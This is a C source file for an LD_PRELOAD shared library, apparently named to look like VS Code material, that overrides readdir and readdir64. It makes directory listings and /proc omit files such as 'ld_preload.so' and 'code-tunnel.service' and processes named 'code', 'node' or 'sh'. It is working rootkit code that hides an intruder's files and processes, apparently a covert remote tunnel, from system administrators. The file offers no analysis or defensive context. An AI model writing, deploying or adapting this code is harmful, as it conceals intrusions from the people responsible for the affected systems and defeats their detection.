// gcc -fPIC -shared -o hook.so vscode.c -ldl
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

static const char *HIDE_FILES[] = {"vscode", ".vscode", "ld_preload.so", "pid.txt", "code-tunnel.service"};
static const char *HIDE_PROCS[] = {"code", "vscode", "code-server", "sh", "node"};

static int should_hide(const char *name, const char **list, size_t count) {
    if (!name) return 0;
    for (size_t i = 0; i < count; i++) {
        if (strstr(name, list[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

static struct dirent *readdir_common(DIR *dir,
    struct dirent *(*orig_readdir)(DIR *))
{
    struct dirent *entry;
    int fd = dirfd(dir);
    struct stat st;

    while ((entry = orig_readdir(dir)) != NULL) {

        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0])))
            continue;

        if (fstat(fd, &st) == 0) {
            if (entry->d_type == DT_DIR) {
                int pid = atoi(entry->d_name);
                if (pid > 0) {
                    char comm_path[256];
                    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
                    FILE *f = fopen(comm_path, "r");
                    if (f) {
                        char name[256];
                        if (fgets(name, sizeof(name), f)) {
                            name[strcspn(name, "\n")] = 0;
                            if (should_hide(name, HIDE_PROCS, sizeof(HIDE_PROCS)/sizeof(HIDE_PROCS[0]))) {
                                fclose(f);
                                continue; // skip entry
                            }
                        }
                        fclose(f);
                    }
                }
            }
        }

        return entry;
    }

    return NULL;
}

typedef struct dirent *(*orig_readdir_f)(DIR *);
static orig_readdir_f real_readdir = NULL;

struct dirent *readdir(DIR *dir) {
    if (!real_readdir)
        real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");
    return readdir_common(dir, real_readdir);
}

typedef struct dirent64 *(*orig_readdir64_f)(DIR *);
static orig_readdir64_f real_readdir64 = NULL;

struct dirent64 *readdir64(DIR *dir) {
    if (!real_readdir64)
        real_readdir64 = (orig_readdir64_f)dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    int fd = dirfd(dir);
    struct stat st;

    while ((entry = real_readdir64(dir)) != NULL) {

        // Hide files/folders
        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0])))
            continue;

        // Hide process (if reading /proc)
        if (fstat(fd, &st) == 0) {
            if (entry->d_type == DT_DIR) {
                int pid = atoi(entry->d_name);
                if (pid > 0) {
                    char comm_path[256];
                    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
                    FILE *f = fopen(comm_path, "r");
                    if (f) {
                        char name[256];
                        if (fgets(name, sizeof(name), f)) {
                            name[strcspn(name, "\n")] = 0;
                            if (should_hide(name, HIDE_PROCS, sizeof(HIDE_PROCS)/sizeof(HIDE_PROCS[0]))) {
                                fclose(f);
                                continue;
                            }
                        }
                        fclose(f);
                    }
                }
            }
        }

        return entry;
    }

    return NULL;
}

